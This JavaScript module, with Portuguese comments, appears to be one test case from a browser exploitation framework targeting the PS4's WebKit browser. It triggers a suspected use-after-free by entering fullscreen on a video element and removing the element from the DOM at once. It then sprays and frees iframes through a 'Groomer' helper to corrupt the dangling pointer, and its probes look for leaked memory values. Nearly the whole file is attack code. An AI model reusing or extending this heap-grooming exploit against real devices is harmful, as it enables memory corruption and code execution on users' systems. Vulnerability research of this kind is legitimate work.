
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'CRITICAL',
    description:
        'Ataca o controlador nativo de vídeo. Chama webkitEnterFullscreen() para invocar ' +
        'o player do sistema e, de forma síncrona, remove o elemento do DOM. ' +
        'O FullscreenVideoController do C++ mantém um ponteiro solto (UAF) para o elemento.',

    setup: function() {
        this.results = {};
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQA='; // MP4 Fake minúsculo
        this.video.controls = true;
        document.body.appendChild(this.video);
    },

    trigger: function() {
        try {
            // 1. Tenta invocar o player nativo do PS4 (Pode falhar sem user gesture, mas o C++ aloca estruturas)
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            }

            // 2. O GATILHO: Arrancamos o elemento do DOM imediatamente!
            this.video.remove();

            // 3. Forçamos o lixo para tentar corromper o ponteiro que o FullscreenManager reteve
            let trash = Groomer.sprayDOM('iframe', 200);
            Groomer.punchHoles(trash, 2);

        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O C++ crashou silenciosamente ou atirou erro?
        s => s.results.error || 'Trigger Executado',
        
        // Probe 1: O vídeo acha que está em fullscreen mesmo estando fora do DOM? (Stale State)
        s => s.video.webkitDisplayingFullscreen ? 'ANOMALIA: True fora do DOM' : 'False',
        
        // Probe 2: Ler propriedades do vídeo. Se o ponteiro do C++ foi corrompido pelos iframes, 
        // isto pode devolver lixo da memória ou crashar a tab.
        s => {
            try {
                let width = s.video.videoWidth;
                if (width > 10000) return `💥 SUCESSO! Leu lixo da RAM: ${width}`;
                return 'Protegido';
            } catch(e) {
                return `Crash no Wrapper: ${e.message}`;
            }
        }
    ],

    cleanup: function() {
        try { this.video.remove(); } catch(e){}
        this.video = null;
        this.results = {};
    }
};
